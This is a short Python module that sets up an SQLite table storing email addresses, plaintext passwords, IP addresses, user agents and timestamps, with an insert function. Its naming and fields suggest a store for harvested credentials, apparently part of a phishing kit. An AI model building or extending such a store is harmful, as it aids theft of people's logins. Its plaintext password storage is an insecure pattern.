import sqlite3

DB_NAME = "creds.db"

def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                ip TEXT,
                user_agent TEXT,
                timestamp TEXT,
                status TEXT DEFAULT 'Pending'
            )
        ''')
        conn.commit()

def insert_credential(email, password, ip, user_agent, timestamp):
        with sqlite3.connect(DB_NAME) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO credentials (email, password, ip, user_agent, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (email, password, ip, user_agent, timestamp))
            conn.commit
